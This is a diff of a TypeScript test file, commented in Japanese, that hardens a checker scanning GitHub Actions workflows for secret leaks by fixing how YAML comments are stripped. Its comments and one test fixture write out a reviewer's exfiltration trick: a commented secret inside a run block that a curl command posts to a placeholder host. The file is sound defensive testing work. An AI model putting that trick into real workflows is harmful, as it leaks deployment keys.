@@ -89,14 +89,90 @@ const here = dirname(fileURLToPath(import.meta.url));
 const wfDir = resolve(here, "../../../.github/workflows");
 const read = (f: string) => readFileSync(resolve(wfDir, f), "utf8");
 
-/** 行末コメントを落とす（クォート内の `#` は扱わない。この用途では出てこない） */
+/**
+ * 1 行の中で **YAML のコメントが始まる位置**を返す（無ければ -1）。
+ *
+ * ── #1137 のレビューが示した穴 ──────────────────────────────────────────
+ * 前の実装は `line.indexOf("#")` だった。**最初の `#` 以降を無条件に捨てていた。**
+ * YAML/GitHub では `#` がコメントにならない場所が 2 つ在り、そこでは `${{ secrets.X }}` が
+ * **展開される**。だから「コメントだから安全」と捨てた中に鍵が入れられた。
+ *
+ * **レビュアーの実効攻撃（変異 N22。当時 0/21 で全部緑・actionlint も exit 0）:**
+ *
+ *     - run: |
+ *         #${{ secrets.DEPLOY_SSH_KEY }}
+ *         sed -n '2p' "$0" | curl -sX POST --data-binary @- https://example.invalid/c
+ *
+ * GitHub は `run:` の中身を**スクリプトのファイルに書き出してから** shell に渡す。
+ * `${{ }}` は YAML より前の段で展開されるので、**2 行目のファイルの中に鍵が書かれる**。
+ * shell から見れば 1 行目はコメントなので、**怪しいコマンドが 1 つも無い**。
+ * `sed` が自分自身（`$0`）を読み返して送り出す。
+ *
+ * ── 規則 ───────────────────────────────────────────────────────────────
+ * `#` がコメントを始めるのは、**次を全部満たす場合だけ**である:
+ *   (1) **行頭（インデントの直後）に在るか、直前の文字が空白である。**
+ *       `${pair#*=}` や `PR_CELL="#$PR"` の `#` は語の一部で、コメントではない
+ *       （実在する。`etl.yml` / `local-assemblies.yml` の `run:` ブロック）。
+ *   (2) **クォート（`'` / `"`）の中ではない。**
+ * **ブロックスカラー（`|` / `>`）の中かどうかは 1 行だけでは分からない**ので、
+ * そこは `uncommented()` 側（複数行を見る）が受け持つ。
+ */
+function commentStart(line: string): number {
+  let quote: "'" | '"' | null = null;
+  for (let i = 0; i < line.length; i++) {
+    const c = line[i];
+    if (quote) {
+      // YAML の単一クォートは `''` で自身を表す。二重クォートは `\` で逃がす。
+      if (c === "\\" && quote === '"') i++;
+      else if (c === quote && !(quote === "'" && line[i + 1] === "'")) quote = null;
+      else if (c === quote) i++; // `''`
+      continue;
+    }
+    if (c === "'" || c === '"') {
+      quote = c;
+      continue;
+    }
+    // (1) 行頭、または直前が空白
+    if (c === "#" && (i === 0 || /\s/.test(line[i - 1]))) return i;
+  }
+  return -1;
+}
+
+/** 行末コメントを落とす（**ブロックスカラーの中では使わない**。`uncommented` を見よ） */
 function stripComment(line: string): string {
-  const i = line.indexOf("#");
+  const i = commentStart(line);
   return (i < 0 ? line : line.slice(0, i)).trimEnd();
 }
 
-/** コメントを落とした本文（行頭コメントも消える） */
-const uncommented = (s: string) => s.split("\n").map(stripComment).join("\n");
+/**
+ * コメントを落とした本文（行頭コメントも消える）。
+ *
+ * **ブロックスカラー（`key: |` / `key: >`）の中身は 1 文字も落とさない。**
+ * そこでは `#` は逐語の文字であり、`${{ secrets.X }}` は GitHub が展開する（上の N22）。
+ * ブロックは「導入行より深いインデント」が続く間（空行は跨ぐ）とする。
+ */
+const uncommented = (s: string) => {
+  const lines = s.split("\n");
+  const indentOf = (l: string) => l.length - l.trimStart().length;
+  /** ブロックスカラーの中なら、その導入行のインデント。外なら null */
+  let blockAt: number | null = null;
+  return lines
+    .map((l) => {
+      if (blockAt !== null) {
+        if (l.trim() === "" || indentOf(l) > blockAt) return l; // 中身は**そのまま**
+        blockAt = null; // ブロックが閉じた
+      }
+      const out = stripComment(l);
+      // 導入行そのものはコメントを落としてから判定する（`run: |  # note` の形）。
+      // `|` `>` に続く `-`/`+`（chomp）と桁数の指示（`|2`）も受ける。
+      // **最初は `/^\s*-?\s*[|>].../` も or で並べていたが、変異で消しても 28/28 緑だった
+      // ——`(^|:)` が `- |` の形も拾うので死んだ枝だった。検査の中の死んだ枝は、
+      // 守っているつもりの範囲を実際より広く見せるので外した。**
+      if (/(^|:)\s*[|>][-+]?\d?\s*$/.test(out)) blockAt = indentOf(l);
+      return out;
+    })
+    .join("\n");
+};
 
 type Job = {
   file: string;
@@ -146,7 +222,9 @@ function jobsOfText(text: string, file: string): Job[] {
       file,
       name: h.m[1] ?? h.m[2] ?? h.m[3],
       directKeys: direct.map((l) => stripComment(l).trim().replace(/:.*$/, "")).filter(Boolean),
-      body: own.map(stripComment).join("\n"),
+      // **`uncommented` を通す**（行ごとの `stripComment` だとブロックスカラーの中を
+      // コメントとして落とし、`run: |` に仕込んだ `#${{ secrets.X }}` を見逃す。#1137 レビュー）
+      body: uncommented(own.join("\n")),
       uses: usesLine?.replace(/^\s*uses:\s*/, "").trim(),
     };
   });
@@ -191,7 +269,7 @@ function buildsCode(body: string): boolean {
 function secretLines(body: string): string[] {
   return body
     .split("\n")
-    .filter((l) => /\bsecrets\b/.test(l))
+    .filter((l) => /\bsecrets\b/i.test(l)) // `i`: 大文字 `SECRETS.` の変異が素通りしていた（#1137 レビュー）
     .map((l) => l.trim());
 }
 
@@ -643,4 +721,175 @@ test("#1137 検査の検査: uses: の値を読めている（別 workflow へ�
   const [j] = jobsOfText(yaml, "probe.yml");
   assert.equal(j.uses, "./.github/workflows/build-site.yml");
   assert.deepEqual(secretLines(j.body), [], "secrets を渡していない呼び出しを誤検出している");
+});
+
+// ─────────────────────────────────────────────────────────────────────────────
+// #1137 レビュー指摘: **コメント落としが `run:` ブロックとクォートの中の `#` を
+// 本物のコメントと取り違えていた。** YAML/GitHub ではその 2 か所で `#` はコメントにならず、
+// `${{ secrets.X }}` が展開される。
+//
+// **レビュアーの実効攻撃（変異 N22。当時 0/21 で全部緑・actionlint も exit 0）:**
+//
+//     - run: |
+//         #${{ secrets.DEPLOY_SSH_KEY }}
+//         sed -n '2p' "$0" | curl -sX POST --data-binary @- https://example.invalid/c
+//
+// GitHub が 2 行目に鍵を展開して**スクリプトのファイルに書き**、shell にはコメントなので
+// 怪しいコマンドが 1 つも無い。`sed` が自分自身を読み返して送り出す。
+// **検査は `#` 以降を捨てていたので `secrets` を見なかった。**
+//
+// ── 正しい規則（ここで固定する）────────────────────────────────────────
+// YAML でコメントになる `#` は、**次の 3 つを全部満たす場合だけ**である:
+//   (1) **ブロックスカラー（`|` / `>`）の中ではない。** 中身は逐語のテキストで、`#` は文字である。
+//   (2) **行頭（インデントの直後）に在るか、直前が空白である。** `a#b` の `#` は語の一部。
+//   (3) **クォート（`'` / `"`）の中ではない。**
+//
+// ── 偽陽性を増やさないことも同時に固定する（レビュアーが測って「正しい挙動」と明記）──
+//   `KEY: ${{ env.X }} # ${{ secrets.X }}`（クォート無しの行末コメント）は **緑のまま**
+//   `build-site.yml` の docblock が `secrets` を 18 回書いて **緑のまま**
+// **「コメント落としを全部やめる」のは誤りである。** 上の 2 つが赤くなる。
+// ─────────────────────────────────────────────────────────────────────────────
+
+/**
+ * ── 同型の `#` 落としは他にも在るが、今回は触らない（**数えてから言う**。#757）──
+ * `indexOf("#")` という同じ形は `packages/etl/test/` に **10 本**在る
+ * （`branch-protection-jobs` / `workflow-{scrum-monitor,data-pr-push,released-chain,
+ * pr-body-edited,needs-resolve,deploy-data-push,timeout,deploy-split,deploy-concurrency}`）。
+ * **そのうち鍵の漏洩を見ているのはこの 1 本だけである。**
+ * 残り 9 本で `secrets` という語が出るのは 4 本・合計 20 行で、**内訳は
+ * 逐語の job 名 `issue-secrets` が 17 行、コメントの地の文が 3 行**
+ * （`workflow-timeout.test.ts:21` の「許されるキー」の引用に含まれる `"secrets"` を含む）。
+ * **どれも「どの job が鍵を読めるか」を判定していない**ので、`#` の取り違えが
+ * 鍵の経路を見逃すことに繋がらない。**だから今回の範囲はこの 1 本に限る。**
+ */
+
+/** 合成する YAML の行のインデント（`env:` の下の深さ） */
+const FENCE = "          ";
+
+test("#1137 レビュー: `run:` ブロックの中の行頭 `#` はコメントではない（変異 N22 の経路）", () => {
+  // **GitHub はここに鍵を展開する。** shell のコメントなので実行はされないが、
+  // **スクリプトのファイルの中には書かれる**ので、同じスクリプトが自分を読めば持ち出せる。
+  const yaml = [
+    "jobs:",
+    "  x:",
+    "    runs-on: ubuntu-latest",
+    "    steps:",
+    "      - run: |",
+    "          #${{ secrets.DEPLOY_SSH_KEY }}",
+    "          sed -n '2p' \"$0\" | curl -sX POST --data-binary @- https://example.invalid/c",
+    "",
+  ].join("\n");
+  assert.deepEqual(
+    secretLines(uncommented(yaml)),
+    ["#${{ secrets.DEPLOY_SSH_KEY }}"],
+    "`run: |` の中の行頭 `#` を YAML のコメントと取り違えている（**鍵はここに展開される**）",
+  );
+  // job 本文の経路（jobsOfText → body）でも同じこと
+  const [j] = jobsOfText(yaml, "probe.yml");
+  assert.equal(secretLines(j.body).length, 1, "job 本文の側でも取り違えている");
+});
+
+test("#1137 レビュー: `run: |` の中の空白付き `#` もコメントではない", () => {
+  const yaml = [
+    "jobs:",
+    "  x:",
+    "    runs-on: ubuntu-latest",
+    "    steps:",
+    "      - run: |",
+    "          echo hi  # ${{ secrets.DEPLOY_SSH_KEY }}",
+    "",
+  ].join("\n");
+  assert.equal(secretLines(uncommented(yaml)).length, 1, "ブロックスカラーの中では `#` は常に文字である");
+});
+
+test("#1137 レビュー: クォートの中の `#` はコメントではない", () => {
+  for (const l of [
+    `${FENCE}KEY: "# ${"${{"} secrets.DEPLOY_SSH_KEY ${"}}"}"`,
+    `${FENCE}KEY: '# ${"${{"} secrets.DEPLOY_SSH_KEY ${"}}"}'`,
+    // **クォート追跡が実際に効くのはこの形である。**
+    // 上の 2 つは `#` の直前が `"` / `'` なので、規則 (1)（直前が空白）だけで守られる。
+    // **`#` の直前が空白で、かつクォートの中**のときに初めて (2) が要る
+    // ——これに気づかず上の 2 つだけを並べていたら、**クォート追跡を潰す変異（I2）が
+    // 27/27 緑で素通りした。実装ではなく fixture が弱かった。**
+    `${FENCE}KEY: "x # ${"${{"} secrets.DEPLOY_SSH_KEY ${"}}"}"`,
+    `${FENCE}KEY: 'x # ${"${{"} secrets.DEPLOY_SSH_KEY ${"}}"}'`,
+  ]) {
+    assert.equal(secretLines(uncommented(l)).length, 1, `クォート内の \`#\` をコメントと取り違えている: ${l.trim()}`);
+  }
+});
+
+test("#1137 レビュー: 語の中の `#` はコメントではない（ブロックスカラーの外でも）", () => {
+  // **ブロックスカラーの外**でも、`#` の直前が空白でなければコメントではない。
+  // これを塞がないと `commentStart` を `indexOf("#")` に戻す変異（I1）が素通りする
+  // （下の `${pair#*=}` の検査は `run: |` の中なので、ブロック認識だけで守られていた）。
+  const l = `${FENCE}KEY: tag#${"${{"} secrets.DEPLOY_SSH_KEY ${"}}"}`;
+  assert.equal(secretLines(uncommented(l)).length, 1, `語の中の \`#\` をコメントと取り違えている: ${l.trim()}`);
+  // **向きを両方固定する。** 同じ行の中に語中 `#` と本物の行末コメントが在るとき、
+  // 残るのは語中 `#` までで、コメント側の `secrets` は落ちること。
+  assert.equal(
+    uncommented(`${FENCE}KEY: tag#v1 # ${"${{"} secrets.X ${"}}"}`).trim(),
+    "KEY: tag#v1",
+    "語中 `#` を残しつつ、空白のあとの本物のコメントを落とせていない",
+  );
+  assert.deepEqual(secretLines(uncommented(`${FENCE}KEY: tag#v1 # ${"${{"} secrets.X ${"}}"}`)), []);
+});
+
+test("#1137 レビュー: ブロックスカラーは、同じ深さの行に戻った時点で閉じる", () => {
+  // **ブロックが閉じないと、その後ろの本物のコメントまで残って偽陽性になる。**
+  // `>` を `>=` に変える変異（I7）は検査を**強くする**向きなので「鍵が漏れる」側ではないが、
+  // 偽陽性は本物の分割を落とすので、境界をここで固定する。
+  const yaml = [
+    "jobs:",
+    "  x:",
+    "    runs-on: ubuntu-latest",
+    "    steps:",
+    "      - run: |",
+    "          echo a",
+    `      - name: next # ${"${{"} secrets.X ${"}}"}`, // 導入行と同じ深さ = ブロックの外 = 本物のコメント
+    "",
+  ].join("\n");
+  assert.deepEqual(
+    secretLines(uncommented(yaml)),
+    [],
+    "ブロックスカラーが同じ深さの行で閉じていない（後続の本物のコメントまで残り、偽陽性になる）",
+  );
+  // 逆向き: ブロックの**中**（より深い）は残ること（この検査が空回りしていない証拠）
+  const inside = yaml.replace("          echo a", `          echo a # ${"${{"} secrets.X ${"}}"}`);
+  assert.equal(secretLines(uncommented(inside)).length, 1, "ブロックの中身を落としている");
+});
+
+test("#1137 レビュー: 本物の行末コメントは落ちたままである（偽陽性を増やさない）", () => {
+  // **レビュアーが測って「緑のままなのが正しい挙動」と明記した形。**
+  const l = `${FENCE}KEY: ${"${{"} env.X ${"}}"} # ${"${{"} secrets.X ${"}}"}`;
+  assert.deepEqual(secretLines(uncommented(l)), [], `本物の行末コメントが落ちていない（偽陽性）: ${l.trim()}`);
+  // 行頭コメント（ブロックスカラーの外）も落ちたまま
+  assert.deepEqual(secretLines(uncommented("      # note: secrets used to be here (#1137)")), []);
+  // `build-site.yml` の docblock は `secrets` を何度も正当に書く。**緑のまま**であること。
+  const doc = read("build-site.yml");
+  const rawDocHits = doc.split("\n").filter((l) => /^\s*#/.test(l) && /\bsecrets\b/i.test(l)).length;
+  assert.ok(rawDocHits >= 15, `build-site.yml の docblock が \`secrets\` を ${rawDocHits} 行しか書いていない（実測 2026-10-04: 18 行）。この検査が空回りしている`);
+  assert.deepEqual(secretLines(uncommented(doc)), [], "build-site.yml の docblock が偽陽性になった");
+});
+
+test("#1137 レビュー: `${pair#*=}` / `PR_CELL=\"#$PR\"` を途中で切らない（語の中の `#`）", () => {
+  // **実在する形**（`etl.yml` / `local-assemblies.yml` の `run:` ブロック）。
+  // 前の実装はここで行を切っていた（`echo "` だけが残っていた）。
+  for (const [raw, must] of [
+    ['          echo "### $name (${pair#*=})" | tee -a etl.log', "pair#*=" ],
+    ['          if [ -n "$PR" ]; then PR_CELL="#$PR"; else PR_CELL="なし"; fi', "PR_CELL" ],
+  ] as const) {
+    const yaml = ["jobs:", "  x:", "    runs-on: ubuntu-latest", "    steps:", "      - run: |", raw, ""].join("\n");
+    assert.match(uncommented(yaml), new RegExp(must.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")), `\`${must}\` が切り落とされている: ${raw.trim()}`);
+  }
+  // 実ファイルでも確かめる（母数つき。#757）
+  const hashInRun = ["etl.yml", "local-assemblies.yml"]
+    .flatMap((f) => uncommented(read(f)).split("\n"))
+    .filter((l) => /\$\{[A-Za-z_][A-Za-z0-9_]*#/.test(l) || /PR_CELL="#/.test(l)).length;
+  assert.ok(hashInRun >= 4, `\`run:\` の中の語中 \`#\` が ${hashInRun} 行しか残っていない（実測 2026-10-04: 5 行）`);
+});
+
+test("#1137 レビュー: `secrets` の照合は大文字小文字を区別しない（`SECRETS.` が素通りしていた）", () => {
+  const l = `${FENCE}KEY: ${"${{"} SECRETS.DEPLOY_SSH_KEY ${"}}"}`;
+  assert.deepEqual(secretLines(l), [l.trim()], "大文字 `SECRETS.` を拾えていない");
+  assert.equal(secretLines(`${FENCE}ALL: ${"${{"} toJSON(Secrets) ${"}}"}`).length, 1, "`toJSON(Secrets)` を拾えていない");
 });
